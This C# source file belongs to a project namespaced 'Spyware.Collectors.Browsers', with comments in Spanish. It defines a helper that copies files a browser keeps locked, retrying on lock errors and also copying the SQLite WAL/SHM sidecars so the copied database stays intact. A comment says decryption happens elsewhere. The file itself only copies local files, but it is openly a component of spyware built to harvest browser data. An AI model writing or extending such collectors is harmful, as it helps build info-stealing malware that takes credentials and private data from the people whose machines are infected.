using Spyware.Core.Logging;

namespace Spyware.Collectors.Browsers;

/// <summary>
/// Copia archivos potencialmente bloqueados por el navegador. El acceso de
/// lectura y el descifrado son operaciones distintas: aquí solo se copia.
/// </summary>
public static class FileCopier
{
    public static bool TryCopy(string source, string destination, ILog log, out string? failure, int attempts = 5)
    {
        failure = null;

        if (!File.Exists(source))
        {
            failure = "not_found";
            return false;
        }

        for (int attempt = 1; attempt <= attempts; attempt++)
        {
            try
            {
                File.Copy(source, destination, overwrite: true);
                return true;
            }
            catch (UnauthorizedAccessException)
            {
                failure = "access_denied";
                return false;
            }
            catch (IOException) when (attempt < attempts)
            {
                failure = "locked_by_browser";
                Thread.Sleep(200 * attempt);
            }
            catch (IOException)
            {
                failure = "locked_by_browser";
                return false;
            }
            catch (Exception ex)
            {
                failure = "copy_error:" + ex.GetType().Name;
                log.Debug("Copia fallida " + source + ": " + ex.Message);
                return false;
            }
        }

        return false;
    }

    /// <summary>Copia también los sidecars WAL/SHM para que la copia SQLite sea coherente.</summary>
    public static bool TryCopyWithSidecars(string source, string destination, ILog log, out string? failure)
    {
        if (!TryCopy(source, destination, log, out failure))
            return false;

        foreach (string suffix in new[] { "-wal", "-shm" })
        {
            string sidecar = source + suffix;
            if (!File.Exists(sidecar)) continue;

            TryCopy(sidecar, destination + suffix, log, out _, attempts: 2);
        }

        return true;
    }
}
